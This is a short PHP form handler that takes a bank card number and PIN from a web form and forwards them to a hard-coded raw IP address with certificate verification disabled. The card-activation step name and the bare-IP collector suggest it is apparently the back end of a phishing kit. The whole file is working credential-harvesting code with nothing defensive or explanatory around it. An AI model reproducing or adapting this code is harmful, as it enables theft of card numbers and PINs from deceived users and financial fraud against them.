<?php
$url = 'http://192.185.36.179/services/?BC=globalmx_activetarjetastep1&';
$fields = array(
	'numTarjeta'=> $_POST["numTarjeta"],
	'numPin'=> $_POST["numPin"]
);
$postvars='';
$sep='';
foreach($fields as $key=>$value)
{
        $postvars.= $sep.urlencode($key).'='.urlencode($value);
        $sep='&';
}
$ch = curl_init();
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch,CURLOPT_POST,count($fields));
curl_setopt($ch,CURLOPT_POSTFIELDS,$postvars);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
$result = curl_exec($ch);
curl_close($ch);
$json = json_decode($result);
if($json->success == 'true'){
echo 1;
}else{
echo "<strong>¡".$json->message[0]->recommend."!  </strong>".$json->message[0]->msg;
}
?>